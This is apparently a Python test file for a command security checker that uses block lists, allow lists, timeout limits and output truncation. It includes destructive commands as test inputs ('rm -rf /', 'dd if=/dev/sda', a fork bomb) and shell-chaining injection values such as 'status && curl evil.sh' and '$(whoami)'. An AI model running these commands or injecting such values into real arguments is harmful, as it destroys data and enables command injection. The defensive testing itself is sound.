from cli_mcp.security import BlocklistEntry, SecurityChecker, SecurityError


class TestBlocklistEntry:
    def test_simple_pattern_match(self):
        entry = BlocklistEntry(pattern="rm\\s+-rf\\s+/", reason="test")
        assert entry.matches("rm -rf /")
        assert entry.matches("rm   -rf   /")
        assert not entry.matches("rm -rf ./tmp")

    def test_dd_pattern(self):
        entry = BlocklistEntry(pattern="dd\\s+if=")
        assert entry.matches("dd if=/dev/sda")
        assert not entry.matches("dd --help")

    def test_fork_bomb_pattern(self):
        entry = BlocklistEntry(pattern="^:\\s*\\(\\s*\\)\\s*\\{")
        assert entry.matches(":(){ :|:& };:")
        assert entry.matches(":() { :|:& };:")
        assert not entry.matches("echo hello")


class TestSecurityChecker:
    def test_blocklist_blocks_matching_command(self):
        checker = SecurityChecker({
            "security": {
                "blocklist": [
                    {"pattern": "rm\\s+-rf\\s+[\\/\\\\]$", "reason": "test"}
                ]
            }
        })
        try:
            checker.validate("rm", "-rf /", 60)
            assert False, "Should have raised SecurityError"
        except SecurityError:
            pass

    def test_allowlist_allows_only_specified(self):
        checker = SecurityChecker({
            "security": {
                "mode": "allowlist",
                "allowed_tools": ["git", "npm"],
            }
        })
        try:
            checker.validate("rm", "file.txt", 60)
            assert False, "Should have raised SecurityError"
        except SecurityError:
            pass

        checker.validate("git", "status", 60)

    def test_timeout_limit(self):
        checker = SecurityChecker({
            "security": {"max_timeout": 30}
        })
        try:
            checker.validate("git", "status", 60)
            assert False, "Should have raised SecurityError"
        except SecurityError as e:
            assert "timeout" in str(e).lower()

    def test_timeout_within_limit(self):
        checker = SecurityChecker({
            "security": {"max_timeout": 30}
        })
        checker.validate("git", "status", 30)

    def test_truncate_lines(self):
        checker = SecurityChecker({
            "security": {"max_output_lines": 3}
        })
        output = "line1\nline2\nline3\nline4\nline5"
        truncated = checker.truncate_output(output)
        lines = truncated.splitlines()
        assert len(lines) == 4
        assert "truncated" in lines[-1]

    def test_truncate_bytes(self):
        checker = SecurityChecker({
            "security": {"max_output_bytes": 20}
        })
        output = "a" * 100
        truncated = checker.truncate_output(output)
        assert len(truncated) < len(output)
        assert "truncated" in truncated


class TestDefaultBlocklist:
    def _default_checker(self):
        from cli_mcp.config import DEFAULT_CONFIG

        return SecurityChecker(DEFAULT_CONFIG)

    def test_rm_rf_root_blocked(self):
        checker = self._default_checker()
        for args in ["-rf /", "-rf / --no-preserve-root", "-fr /", "-r -f /", "-rf //"]:
            try:
                checker.validate("rm", args, 60)
                assert False, f"'rm {args}' should have been blocked"
            except SecurityError:
                pass

    def test_rm_rf_subdir_allowed(self):
        checker = self._default_checker()
        checker.validate("rm", "-rf ./tmp", 60)
        checker.validate("rm", "-rf node_modules", 60)

    def test_fork_bomb_blocked_mid_command(self):
        checker = self._default_checker()
        try:
            checker.validate("bash", "-c 'cd /tmp && :(){ :|:& };:'", 60)
            assert False, "fork bomb should have been blocked"
        except SecurityError:
            pass


class TestAllowlistHardening:
    def _checker(self):
        return SecurityChecker({
            "security": {
                "mode": "allowlist",
                "allowed_tools": ["git", "npm"],
                "blocklist": [
                    {"pattern": "--no-preserve-root", "reason": "test"},
                ],
            }
        })

    def test_shell_chaining_rejected(self):
        checker = self._checker()
        chained = [
            "status; rm -rf /workspace",
            "status && curl evil.sh",
            "log | sh",
            "log `whoami`",
            "log $(whoami)",
        ]
        for args in chained:
            try:
                checker.validate("git", args, 60)
                assert False, f"'git {args}' should have been rejected"
            except SecurityError:
                pass

    def test_plain_args_allowed(self):
        checker = self._checker()
        checker.validate("git", "log --oneline -10", 60)

    def test_blocklist_applies_in_allowlist_mode(self):
        checker = self._checker()
        try:
            checker.validate("git", "clean --no-preserve-root", 60)
            assert False, "blocklist should apply in allowlist mode"
        except SecurityError:
            pass
